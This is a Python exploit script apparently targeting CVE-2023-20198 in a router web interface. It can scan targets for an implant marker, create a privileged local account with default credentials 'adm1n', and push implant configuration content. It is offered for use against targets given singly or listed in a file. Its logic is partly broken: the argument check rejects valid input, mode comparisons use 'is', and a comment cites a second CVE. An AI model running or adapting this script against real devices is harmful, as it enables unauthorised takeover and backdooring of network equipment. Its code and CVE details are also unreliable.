import requests
import argparse


def check_me(target):
    success_ips = []
    failed_ips = []
    url = f"https://{target}/webui/logoutconfirm.html"
    check_payload = {"logon_hash": "1"}
    try:
        response = requests.post(url, data=check_payload, timeout=3, verify=False)
        if response.status_code == 200:
            print(f"IP: {target} - Status: {response.status_code}")
            # Check if the response content is a suspicious mark of length < 32 characters.
            if len(response.text) < 32:
                print(f"IP: {target} - Response is a potentially suspicious: {response.text}")
                success_ips.append(target)
            else:
                print(f"IP: {target} - Response is to long.")
                failed_ips.append(target)
        else:
            print(f"IP: {target} - Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"IP: {target} - Error: no reply, target is possibly offline or unavailable")
        print(f"The tracelog is {e}")


def exploit_me(target, username, password, config):
    url = f"https://{target}/webui/create_user"
    user_payload = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(url, data=user_payload, verify=False)

        if response.status_code == 200:
            print(f"Target {target}. Successfully created local user account: {username}, {password}")
            # Exploit CVE-2021-1435 to install the implant
            install_url = f"https://{target}/webui/cisco_service.conf"
            config_payload = {
                "config_content": config
            }
            response = requests.post(install_url, data=config_payload, verify=False)
            if response.status_code == 200:
                print(f"Target {target}. The config is successfully created: {config}")
            else:
                print(f"IP: {target} - Status: {response.status_code}")
        else:
            print(f"IP: {target} - Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"IP: {target} - Error: no reply, target is possibly offline or unavailable")
        print(f"The tracelog is {e}")


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog="iveresk CVE-2023-20198. CVSS3.1 10.0")
    parser.add_argument('-m', '--mode', help='Set the mode of the execution. '
                                             'Exploit or infrastructure check', required=True, type=str, default="check")
    parser.add_argument('-t', '--target', help='A target IP', required=False, type=str)
    parser.add_argument('-f', '--file', help='A file with target IPs', required=False, type=str)
    parser.add_argument('-u', '--username', help='The user name for the exploit', required=False, type=str)
    parser.add_argument('-p', '--password', help='The password for the exploit', required=False, type=str)
    parser.add_argument('-c', '--config', help='The password for the exploit', required=False, type=str)
    args = parser.parse_args()
    # default params for the exploit
    username = "adm1n"
    password = "adm1n"
    config = "<insert implant configuration content here>"
    # checking on parameters variation
    if args.target is None or args.file is None:
        args.print_help()
        exit(0)
    if args.file is None:
        target = args.target
    else:
        target = args.file
    if args.mode is "check":
        check_me(target)
    if args.mode is "exploit":
        if args.username is not None:
            username = args.username
        if args.password is not None:
            password = args.password
        if args.config is not None:
            config = args.config
        exploit_me(target, username, password, config)
